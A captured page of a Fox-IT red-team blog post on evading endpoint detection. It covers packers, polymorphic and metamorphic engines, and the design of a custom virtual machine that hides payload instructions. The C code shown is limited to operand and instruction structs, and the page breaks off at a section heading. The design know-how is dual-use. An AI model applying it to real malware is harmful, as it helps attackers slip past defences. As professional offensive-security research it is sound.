# https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/

<!DOCTYPE html><html lang="en-US" class="wf-loading wf-opensans-n6-loading wf-opensans-n4-loading wf-opensans-i4-loading wf-opensans-n7-loading wf-opensans-i7-loading">

<body class="wp-singular post-template-default single single-post postid-4865 single-format-standard wp-custom-logo wp-embed-responsive wp-theme-independent-publisher-2 group-blog custom-colors categories-hidden tags-hidden author-hidden tablet-desktop">

<div id="page" class="hfeed site">
	<a class="skip-link screen-reader-text" href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#content">Skip to content</a>

	<div id="hero-header" class="site-hero-section">
		<!-- #masthead -->
	</div>

				<!-- .main-navigation -->
	
	
	
	<div id="content-wrapper" class="content-wrapper">
		<div id="content" class="site-content">

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

		
			
<article id="post-4865" class="post-4865 post type-post status-publish format-standard hentry category-blog">
			<!-- .entry-header -->		<div class="entry-meta">
			<span class="byline">
				<a href="https://blog.fox-it.com/author/foxsrt/" title="Posts by Fox-SRT" rel="author">Fox-SRT</a>			</span>
							<span class="cat-links">
					<a href="https://blog.fox-it.com/category/blog/" rel="category tag">Blog</a>				</span><!-- .cat-links -->
			
			
			<span class="published-on">
				<time class="entry-date published updated" datetime="2024-09-25T12:36:12+02:00">September 25, 2024</time>			</span>

			<span class="word-count">21 Minutes</span>		</div><!-- .entry-meta -->
	
	<div class="entry-content">
		
<p class="wp-block-paragraph"><strong>Authors</strong>: Boudewijn Meijer &amp;&amp; Rick Veldhoven</p>



<h2 class="wp-block-heading">Introduction</h2>



<p class="wp-block-paragraph">As defensive security products improve, attackers must refine their craft. Gone are the days of executing malicious binaries from disk, especially ones well known to antivirus and Endpoint Detection and Reponse (EDR) vendors. Now, attackers focus on in-memory payload execution for both native and managed applications to evade defensive products. Meanwhile, defensive technologies are becoming increasingly sophisticated, which is forcing attackers to further adapt. In times of such an arms race, how does an attacker stay ahead? And how can malware be future-proofed to evade the sophisticated EDR systems that currently exist and are actively being developed?</p>



<p class="wp-block-paragraph">This blog post reviews the evolution of one of Fox-IT’s evasive tools, designed to aid in payload delivery during Red Teaming engagements. We will touch on the tool’s history and its future potential in the face of offensive and defensive progress.</p>



<h2 class="wp-block-heading"><strong>Historical Perspective</strong></h2>



<p class="wp-block-paragraph">The core of the arms race between malware and antimalware is as follows: antimalware must classify arbitrary programs, in memory or at-rest, as either benign or malicious while operating under a set of constraints. The products are constrained by the amount of performance a user or customer is prepared to surrender in terms of CPU time, memory or bandwidth while the classification takes place, and by how many false-positives the product generates. If the product is too resource intensive, a customer will complain it is slow. If it quarantines important documents, it potentially does more harm than good. These constraints shape and limit each step in the evolution of antimalware products. Not only AV vendors need to worry about performance when writing tools. Malware authors need to take execution speed, or other system changes, into account when deploying malware. Take for example the recently uncovered XZ<sup data-fn="7585f960-0f16-4135-a8ca-4c1a7afaf522" class="fn"><a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#7585f960-0f16-4135-a8ca-4c1a7afaf522" id="7585f960-0f16-4135-a8ca-4c1a7afaf522-link">1</a></sup> backdoor that was spotted by a software engineer due to an increase in login time from 0.2 to 0.8 seconds. Had the authors of this piece of code not observably changed the behavior of the system, the backdoor would have likely been deployed successfully.</p>



<p class="wp-block-paragraph">Since the early days of viruses circulating on floppy disks, writing undetected malware has been a cat-and-mouse game between attackers and defenders. Originally, antivirus software focused strictly on true-positive detection of viruses on the basis of signatures and patterns in a program’s instructions. Absent a mistake in the signature database, a unique signature match guarantees a true-positive match of a malicious sample after which the malicious file can be removed or quarantined. This method of detection strongly adheres to the constraints placed on antimalware products, because simple pattern matches are performant and true-positive detection is almost guaranteed.</p>



<p class="wp-block-paragraph">For malware authors, the solution was simple: to evade detection, the virus must be made impossible to detect through a unique pattern. This may be achieved by changing the code, or by encrypting the code and decrypting it at runtime. If you automate this, you get what is called a packer: a tool that encrypts, compresses or otherwise changes a virus to evade detection. A packer changes the majority of the code in the virus and adds a stub to the code. This stub is often the first piece of code that is executed when the program is launched. Its job is to undo all changes previously made to the original code (e.g. compression or encryption). After all changes are reverted, execution will be passed to the original code. This stub can also make use of anti-reversing/anti-tampering code that attempts to protect the original code from prying eyes.</p>



<p class="wp-block-paragraph">This reduces the amount of “attack surface” for signature creation for samples that are on the disk or otherwise stored at rest. This method is also used to compress binaries for distribution, allowing for smaller release packages. Therefore, not all compressed binaries can be marked as malicious.</p>



<p class="wp-block-paragraph">However, even very small unpacker stubs may match a signature that can be uniquely tied to the packer itself. Combining this signature with some rules related to the amount of entropy in a file, a packer can still be detected with a high degree of accuracy. At this point, the antimalware solution has evolved to utilize metadata about a file, such as entropy, obtaining the ability to detect packed files but at the cost of a higher false-positive rate.</p>



<p class="wp-block-paragraph">The next step in the arms race for malware authors is to eliminate the potential for a signature match in the unpacker stub. This means that the stub must consist of different instructions each time a new sample is created. An important insight is that “what the code does” and “how the code looks” are not 1:1 mappings. There are infinitely many ways to write down computer code to achieve a certain effect or result. There are therefore infinitely many ways in which a particular unpacking algorithm can be written. A packer that is designed to create the unpacking stub that looks different each time can be called polymorphic. The algorithm or code that performs the changes is called a polymorphic engine<sup data-fn="44855f57-fd3e-421c-982e-d36328596170" class="fn"><a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#44855f57-fd3e-421c-982e-d36328596170" id="44855f57-fd3e-421c-982e-d36328596170-link">2</a></sup>.</p>



<p class="wp-block-paragraph">Combining a packer with a polymorphic engine eliminates the “attack surface” for simple signature matches of malware at-rest. Fox-IT has written and maintained two polymorphic packers like this since 2015. Although they still produce good results against modern EDR, even these tools are getting more and more difficult to sneak past defenses. That’s because there’s a conceptual flaw in the polymorphic packer: the original malicious code is still decrypted at some point in order to execute. If antimalware products can time the moment to start scanning for malicious patterns when the packer has finished decoding the malicious code, then detecting malware becomes easy again.</p>



<p class="wp-block-paragraph">Modern operating systems and processors try to ensure that not all data in a computer’s memory can be executed as code for safety reasons<sup data-fn="52fb0fbc-3a9b-4589-8e2d-9d1e8d0c061c" class="fn"><a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#52fb0fbc-3a9b-4589-8e2d-9d1e8d0c061c" id="52fb0fbc-3a9b-4589-8e2d-9d1e8d0c061c-link">3</a></sup>. Particularly, systems are typically designed to prevent the execution of code from writable pages. Therefore, a virus or malware sample that wants to decrypt and/or decompress its own code must first make the changes in writable memory pages. After, the virus changes the page protection to readable and executable and transfers control to the newly modified executable memory. Antimalware products equipped to analyze the behavior of other programs at runtime make use of behavioral patterns like this to decide when to scan the memory of a process for malicious patterns. Because the memory, once decrypted, cannot be changed anymore due to the aforementioned limitations, scanning a process after making memory executable is the ideal time to spot malicious patterns.</p>



<p class="wp-block-paragraph">Antimalware products that are equipped with rules that generate additional signals to determine if a program is malicious or not, are said to employ “heuristics”. Conceptually, antimalware products have achieved a comprehensive set of features to detect malware execution. The evolutions we’ve seen since the early days of these feature complete products can all be understood as attempts to loosen or lift the constraints set out above: “Cloud-based protection” runs resource intensive heuristics on someone else’s computer; adding human oversight, the “R” in “EDR” lowers the impact of a false-positive and brings humans into the detection and response loop.</p>



<p class="wp-block-paragraph">How then, can a Red Team smuggle their malware past these new and advanced defenses? In the past, a virus writer might employ what is called a “metamorphic” engine<sup data-fn="cfd6c36c-6510-4789-b2d1-c0e4563fe349" class="fn"><a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#cfd6c36c-6510-4789-b2d1-c0e4563fe349" id="cfd6c36c-6510-4789-b2d1-c0e4563fe349-link">4</a></sup>. This is an algorithm designed to re-write the entire virus each time it infects a new file, including the entire metamorphic engine itself. Using it ensures that there is never one ‘true’ virus sample that can be detected with a static signature; each copy of the virus is completely different. With a tool like this you would not need a packer, because there are no static patterns that can ever be uniquely tied to your virus. However, the explosion in modern software complexity and the requirement for malware to work on a variety of systems</p>



<h2 class="wp-block-heading"><strong>Hiding From Analysis: Virtualisation</strong></h2>



<p class="wp-block-paragraph">To hide from both static and dynamic analysis of payloads, the generated sample must be resilient to code inspection and code flow analysis. If the <em>real</em> instructions are not revealed to an observer, hardly any conclusions can be drawn from the outer shell. If this is achieved, defensive products would be met with the following limitations when inspecting the payload:</p>



<ul class="wp-block-list">
<li>Difficult to observe instruction patterns;</li>



<li>Difficult to patch instructions;</li>



<li>Difficult to ignore instructions;</li>



<li>Difficult to predict behavior.</li>
</ul>



<p class="wp-block-paragraph">Hiding instructions is not something new. Products like VMProtect<sup data-fn="acb3be7f-0d0e-469f-9341-965d785683ff" class="fn"><a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#acb3be7f-0d0e-469f-9341-965d785683ff" id="acb3be7f-0d0e-469f-9341-965d785683ff-link">5</a></sup> cloak parts of the code by embedding a virtual machine and generate unique instructions to be executed on this VM. Code that is to be virtualized must be identified either by a marker added to the source code or by the presence of a PDB file containing the symbols. This requirement is something that cannot always be met when using third-party tools. Additionally, this type of protection is aimed at protecting specific functions, like license key checking algorithms, limiting the use for an adversary. Lastly, using existing tools can have a negative impact on the detection ratio, as these products are heavily researched and can contain static signatures like hardcoded section names.</p>



<p class="wp-block-paragraph">Considering the benefits of a virtualisation layer, however, it is clear that this technique is very powerful.</p>



<h2 class="wp-block-heading"><strong>Creating a Custom Virtualisation Layer</strong></h2>



<p class="wp-block-paragraph">It was decided that a virtualisation layer should be created. This layer consists of a virtual machine implementing opcodes<sup data-fn="2ebbe913-5b00-48a1-b7b0-e23287e60c0b" class="fn"><a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#2ebbe913-5b00-48a1-b7b0-e23287e60c0b" id="2ebbe913-5b00-48a1-b7b0-e23287e60c0b-link">6</a></sup>, and bytecode<sup data-fn="c7153637-5f3e-4f28-bf6c-424c707b29e3" class="fn"><a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#c7153637-5f3e-4f28-bf6c-424c707b29e3" id="c7153637-5f3e-4f28-bf6c-424c707b29e3-link">7</a></sup> executing on the virtual machine. The virtualisation layer that was to be created must match the following requirements and limitations:</p>



<ol class="wp-block-list">
<li>Bytecode instructions are executed sequentially;</li>



<li>Bytecode instructions are hidden before and after execution;</li>



<li>The instruction set supports basic x86-64 instructions only;</li>



<li>The virtual machine must provide an interface to the system API;</li>



<li>The virtual machine implementation must be simple and position independent to support morphing;</li>



<li>The virtualisation layer must work without access to source code or debug symbols.</li>
</ol>



<p class="wp-block-paragraph">Creating a virtualisation layer started with a design of the instructions to be executed, the virtual machine, and the supported instruction set. Additionally, the layout of the final payload was created where all data must be present in a position independent format and could be executed like shellcode. This allows the payload to be embedded in other executable formats (e.g. executables or DLLs), and allows for dynamic execution when staging malware.</p>



<p class="wp-block-paragraph">For example, the following layout would allow for the above functionality. In this example, the virtual machine must start with a correcting stub that correctly sets the virtual machine argument registers to their respective values:</p>


<div class="wp-block-image">
<figure class="aligncenter size-large"><a href="https://i0.wp.com/blog.fox-it.com/wp-content/uploads/2024/08/layout.png?ssl=1"><img data-recalc-dims="1" fetchpriority="high" decoding="async" width="800" height="248" data-attachment-id="4844" data-permalink="https://blog.fox-it.com/layout/" data-orig-file="https://i0.wp.com/blog.fox-it.com/wp-content/uploads/2024/08/layout.png?fit=2270%2C704&amp;ssl=1" data-orig-size="2270,704" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="layout" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/blog.fox-it.com/wp-content/uploads/2024/08/layout.png?fit=300%2C93&amp;ssl=1" data-large-file="https://i0.wp.com/blog.fox-it.com/wp-content/uploads/2024/08/layout.png?fit=800%2C248&amp;ssl=1" src="https://i0.wp.com/blog.fox-it.com/wp-content/uploads/2024/08/layout.png?resize=800%2C248&amp;ssl=1" alt="" class="wp-image-4844"></a><figcaption class="wp-element-caption"><em>Example of a data structure containing all required building blocks within position independent code.</em></figcaption></figure>
</div>


<h2 class="wp-block-heading has-medium-font-size"><strong>The Anatomy of an Instruction</strong></h2>



<p class="wp-block-paragraph">To keep the virtual machine architecture simple, an instruction format was created to be consistent in length between instruction and operand types. This design decision allows the omission of a Length Disassembler Engine (LDE)<sup data-fn="1960560c-70db-407a-a395-9e1603895b60" class="fn"><a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#1960560c-70db-407a-a395-9e1603895b60" id="1960560c-70db-407a-a395-9e1603895b60-link">8</a></sup>, and can simply use the instruction pointer as an index to the current instruction. All information present in normal, non-SSE<sup data-fn="389cbcc6-797d-4476-9eba-0e3e964d20ff" class="fn"><a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#389cbcc6-797d-4476-9eba-0e3e964d20ff" id="389cbcc6-797d-4476-9eba-0e3e964d20ff-link">9</a></sup>/AVX<sup data-fn="745fab9c-8318-41e7-8c04-e5e6ed908584" class="fn"><a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/#745fab9c-8318-41e7-8c04-e5e6ed908584" id="745fab9c-8318-41e7-8c04-e5e6ed908584-link">10</a></sup> x86 instructions must be included.</p>



<p class="wp-block-paragraph">At its core, an instruction identifies the operation that must be performed, and optionally what data is provided in the form of operands. An operand can be one of three types:</p>



<ol class="wp-block-list">
<li><strong>Immediate value</strong>: a constant value embedded in the instruction;</li>



<li><strong>Memory location</strong>: a memory location pointed to by the instruction;</li>



<li><strong>Register</strong>: a register, or part of one, identified by the instruction.</li>
</ol>



<p class="wp-block-paragraph">In order to obtain data from an operand, a generic format must be created that encompasses the different operand types. It was decided that a single 64-bit field could be used to hold the different types of operands, as all of the necessary data of the aforementioned types can be embedded into 64 bits.</p>



<p class="wp-block-paragraph">The structures below show the layout of each operand type:</p>



<figure class="wp-block-embed is-type-rich is-provider-embed-handler wp-block-embed-embed-handler"><div class="wp-block-embed__wrapper">
<div style="tab-size: 8" id="gist132181890" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        
<div class="js-gist-file-update-container js-task-list-container">
      <div id="file-operand-h" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  " style="overflow: auto" tabindex="0" role="region" aria-label="operand.h content, created by fox-srt on 07:22AM on August 22, 2024.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  
  <div data-view-component="true" class="flash flash-warn flash-full d-flex flex-items-center">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    <span>
      This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
      <a class="Link--inTextBlock" href="https://github.co/hiddenchars" target="_blank">Learn more about bidirectional Unicode characters</a>
    </span>


  <div data-view-component="true" class="flash-action">        <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/" data-view-component="true" class="btn-sm btn">    Show hidden characters
</a>
</div>
</div>

  <span aria-label="This line has hidden Unicode characters" data-view-component="true" class="line-alert tooltipped tooltipped-e">
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
</span>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="operand.h">
        <tbody><tr>
          <td id="file-operand-h-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-operand-h-LC1" class="blob-code blob-code-inner js-file-line">struct ImmediateOperand {</td>
        </tr>
        <tr>
          <td id="file-operand-h-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-operand-h-LC2" class="blob-code blob-code-inner js-file-line">	Value value;           // A constant value</td>
        </tr>
        <tr>
          <td id="file-operand-h-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-operand-h-LC3" class="blob-code blob-code-inner js-file-line">}; // size: 8 bytes</td>
        </tr>
        <tr>
          <td id="file-operand-h-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-operand-h-LC4" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-operand-h-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-operand-h-LC5" class="blob-code blob-code-inner js-file-line">struct MemoryOperand {</td>
        </tr>
        <tr>
          <td id="file-operand-h-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-operand-h-LC6" class="blob-code blob-code-inner js-file-line">	uint8_t size;          // The effective size of the operand (8, 16, 32, 64 bits)</td>
        </tr>
        <tr>
          <td id="file-operand-h-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-operand-h-LC7" class="blob-code blob-code-inner js-file-line">	uint8_t base;          // A regiser holding a pointer value to the base address</td>
        </tr>
        <tr>
          <td id="file-operand-h-L8" class="blob-num js-line-number js-blob-rnum" data-line-number="8"></td>
          <td id="file-operand-h-LC8" class="blob-code blob-code-inner js-file-line">	uint8_t index;         // A register holding the index of the array</td>
        </tr>
        <tr>
          <td id="file-operand-h-L9" class="blob-num js-line-number js-blob-rnum" data-line-number="9"></td>
          <td id="file-operand-h-LC9" class="blob-code blob-code-inner js-file-line">	uint8_t scale;         // A constant multiplier of 1, 2, 4, or 8</td>
        </tr>
        <tr>
          <td id="file-operand-h-L10" class="blob-num js-line-number js-blob-rnum" data-line-number="10"></td>
          <td id="file-operand-h-LC10" class="blob-code blob-code-inner js-file-line">	int32_t displacement;  // A value to be added to the calculated address</td>
        </tr>
        <tr>
          <td id="file-operand-h-L11" class="blob-num js-line-number js-blob-rnum" data-line-number="11"></td>
          <td id="file-operand-h-LC11" class="blob-code blob-code-inner js-file-line">}; // size: 8 bytes</td>
        </tr>
        <tr>
          <td id="file-operand-h-L12" class="blob-num js-line-number js-blob-rnum" data-line-number="12"></td>
          <td id="file-operand-h-LC12" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-operand-h-L13" class="blob-num js-line-number js-blob-rnum" data-line-number="13"></td>
          <td id="file-operand-h-LC13" class="blob-code blob-code-inner js-file-line">struct RegisterOperand {</td>
        </tr>
        <tr>
          <td id="file-operand-h-L14" class="blob-num js-line-number js-blob-rnum" data-line-number="14"></td>
          <td id="file-operand-h-LC14" class="blob-code blob-code-inner js-file-line">	uint8_t	reg;           // A base register of the x86-64 register set </td>
        </tr>
        <tr>
          <td id="file-operand-h-L15" class="blob-num js-line-number js-blob-rnum" data-line-number="15"></td>
          <td id="file-operand-h-LC15" class="blob-code blob-code-inner js-file-line">	uint8_t	chunk;         // The specific register chunk: low, high, word, dword, qword</td>
        </tr>
        <tr>
          <td id="file-operand-h-L16" class="blob-num js-line-number js-blob-rnum" data-line-number="16"></td>
          <td id="file-operand-h-LC16" class="blob-code blob-code-inner js-file-line">	uint16_t size;         // The effective size of the operand (8, 16, 32, 64 bits)</td>
        </tr>
        <tr>
          <td id="file-operand-h-L17" class="blob-num js-line-number js-blob-rnum" data-line-number="17"></td>
          <td id="file-operand-h-LC17" class="blob-code blob-code-inner js-file-line">	uint32_t pad;          // Padding to meet the 64 bit size requirement</td>
        </tr>
        <tr>
          <td id="file-operand-h-L18" class="blob-num js-line-number js-blob-rnum" data-line-number="18"></td>
          <td id="file-operand-h-LC18" class="blob-code blob-code-inner js-file-line">}; // size: 8 bytes</td>
        </tr>
        <tr>
          <td id="file-operand-h-L19" class="blob-num js-line-number js-blob-rnum" data-line-number="19"></td>
          <td id="file-operand-h-LC19" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="file-operand-h-L20" class="blob-num js-line-number js-blob-rnum" data-line-number="20"></td>
          <td id="file-operand-h-LC20" class="blob-code blob-code-inner js-file-line">union Operand {</td>
        </tr>
        <tr>
          <td id="file-operand-h-L21" class="blob-num js-line-number js-blob-rnum" data-line-number="21"></td>
          <td id="file-operand-h-LC21" class="blob-code blob-code-inner js-file-line">	ImmediateOperand imm;  // View the data as an immediate operand</td>
        </tr>
        <tr>
          <td id="file-operand-h-L22" class="blob-num js-line-number js-blob-rnum" data-line-number="22"></td>
          <td id="file-operand-h-LC22" class="blob-code blob-code-inner js-file-line">	MemoryOperand    mem;  // View the data as a memory operand</td>
        </tr>
        <tr>
          <td id="file-operand-h-L23" class="blob-num js-line-number js-blob-rnum" data-line-number="23"></td>
          <td id="file-operand-h-LC23" class="blob-code blob-code-inner js-file-line">	RegisterOperand  reg;  // View the data as a register operand</td>
        </tr>
        <tr>
          <td id="file-operand-h-L24" class="blob-num js-line-number js-blob-rnum" data-line-number="24"></td>
          <td id="file-operand-h-LC24" class="blob-code blob-code-inner js-file-line">}; // size: 8 bytes</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>

</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/fox-srt/be65d595529fee89d202115d79dae0cf/raw/07553c9e32406124e546c25dd4b5b97fe08642ff/operand.h" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/fox-srt/be65d595529fee89d202115d79dae0cf#file-operand-h" class="Link--inTextBlock">
          operand.h
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>

</div></figure>



<p class="wp-block-paragraph"><strong>Note</strong>: <em>The <code>Value</code> type of the immediate operand is a simple <code>union</code> with <code>(u)int8_t</code> to <code>(u)int64_t</code> members. This makes it trivial to index the correct data during implementation of opcodes.</em></p>



<p class="wp-block-paragraph">To indicate the instruction’s <code>opcode</code>, a single 1-byte value can be used. This provides 256 unique opcodes, which should be enough to implement basic behavior. Lastly, the type of each operand must be embedded within the instruction format, as opcode implementations must be able to interrogate these types.</p>



<figure class="wp-block-embed is-type-rich is-provider-embed-handler wp-block-embed-embed-handler"><div class="wp-block-embed__wrapper">
<div style="tab-size: 8" id="gist132181915" class="gist">
    <div class="gist-file" translate="no" data-color-mode="light" data-light-theme="light">
      <div class="gist-data">
        
<div class="js-gist-file-update-container js-task-list-container">
      <div id="file-instruction-h" class="file my-2">
    
    <div itemprop="text" class="Box-body p-0 blob-wrapper data type-c  " style="overflow: auto" tabindex="0" role="region" aria-label="instruction.h content, created by fox-srt on 07:23AM on August 22, 2024.">

        
<div class="js-check-hidden-unicode js-blob-code-container blob-code-content">

  
  <div data-view-component="true" class="flash flash-warn flash-full d-flex flex-items-center">
  <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
    <span>
      This file contains hidden or bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
      <a class="Link--inTextBlock" href="https://github.co/hiddenchars" target="_blank">Learn more about bidirectional Unicode characters</a>
    </span>


  <div data-view-component="true" class="flash-action">        <a href="https://blog.fox-it.com/2024/09/25/red-teaming-in-the-age-of-edr-evasion-of-endpoint-detection-through-malware-virtualisation/" data-view-component="true" class="btn-sm btn">    Show hidden characters
</a>
</div>
</div>

  <span aria-label="This line has hidden Unicode characters" data-view-component="true" class="line-alert tooltipped tooltipped-e">
    <svg aria-hidden="true" height="16" viewBox="0 0 16 16" version="1.1" width="16" data-view-component="true" class="octicon octicon-alert">
    <path d="M6.457 1.047c.659-1.234 2.427-1.234 3.086 0l6.082 11.378A1.75 1.75 0 0 1 14.082 15H1.918a1.75 1.75 0 0 1-1.543-2.575Zm1.763.707a.25.25 0 0 0-.44 0L1.698 13.132a.25.25 0 0 0 .22.368h12.164a.25.25 0 0 0 .22-.368Zm.53 3.996v2.5a.75.75 0 0 1-1.5 0v-2.5a.75.75 0 0 1 1.5 0ZM9 11a1 1 0 1 1-2 0 1 1 0 0 1 2 0Z"></path>
</svg>
</span>

  <table data-hpc="" class="highlight tab-size js-file-line-container" data-tab-size="4" data-paste-markdown-skip="" data-tagsearch-path="instruction.h">
        <tbody><tr>
          <td id="file-instruction-h-L1" class="blob-num js-line-number js-blob-rnum" data-line-number="1"></td>
          <td id="file-instruction-h-LC1" class="blob-code blob-code-inner js-file-line">struct Instruction {</td>
        </tr>
        <tr>
          <td id="file-instruction-h-L2" class="blob-num js-line-number js-blob-rnum" data-line-number="2"></td>
          <td id="file-instruction-h-LC2" class="blob-code blob-code-inner js-file-line">    uint8_t opcode;             // The opcode of the instruction</td>
        </tr>
        <tr>
          <td id="file-instruction-h-L3" class="blob-num js-line-number js-blob-rnum" data-line-number="3"></td>
          <td id="file-instruction-h-LC3" class="blob-code blob-code-inner js-file-line">    uint8_t lparam_type : 4;    // The type of the first (left) operand</td>
        </tr>
        <tr>
          <td id="file-instruction-h-L4" class="blob-num js-line-number js-blob-rnum" data-line-number="4"></td>
          <td id="file-instruction-h-LC4" class="blob-code blob-code-inner js-file-line">    uint8_t rparam_type : 4;    // The type of the second (right) operand</td>
        </tr>
        <tr>
          <td id="file-instruction-h-L5" class="blob-num js-line-number js-blob-rnum" data-line-number="5"></td>
          <td id="file-instruction-h-LC5" class="blob-code blob-code-inner js-file-line">    Operand lparam;             // The first (left) operand</td>
        </tr>
        <tr>
          <td id="file-instruction-h-L6" class="blob-num js-line-number js-blob-rnum" data-line-number="6"></td>
          <td id="file-instruction-h-LC6" class="blob-code blob-code-inner js-file-line">    Operand rparam;             // The second (right) operand</td>
        </tr>
        <tr>
          <td id="file-instruction-h-L7" class="blob-num js-line-number js-blob-rnum" data-line-number="7"></td>
          <td id="file-instruction-h-LC7" class="blob-code blob-code-inner js-file-line">}; // size: 18 bytes</td>
        </tr>
  </tbody></table>
</div>


    </div>

  </div>

</div>

      </div>
      <div class="gist-meta">
        <a href="https://gist.github.com/fox-srt/77864235f6cadde79e086b999a722e73/raw/fd88104ec24bd0885f0a4212cd36fdbeabdf4a6a/instruction.h" style="float:right" class="Link--inTextBlock">view raw</a>
        <a href="https://gist.github.com/fox-srt/77864235f6cadde79e086b999a722e73#file-instruction-h" class="Link--inTextBlock">
          instruction.h
        </a>
        hosted with ❤ by <a class="Link--inTextBlock" href="https://github.com/">GitHub</a>
      </div>
    </div>
</div>

</div></figure>



<h2 class="wp-block-heading has-medium-font-size"><strong>Protecting Instructions</strong></h2>



<p class="wp-block-paragraph">To meet requirement two, <em>“Instructions are hidden before and after execution”</em>, instructions are protected using encryption. Many encryption algorithms can be used to hide instructions. However, it is required for the instruction size to remain the same, as the instruction will be decrypted and encrypted in-place and will not be moved to a temporary buffer. This removes the necessity for dynamic memory allocation from within the virtual machine. Additionally, the chosen encryption scheme must be trivial to implement, as the code will be located in the virtual machine and thus create an ‘attack surface’ for signature detection. Implementing complex algorithms is detrimental to the ability to effectively manipulate the code using a polymorphic engine.</p>



<h2 class="wp-block-heading has-medium-font-size"><strong>The Anatomy of the Virtual Machine</strong></h2>



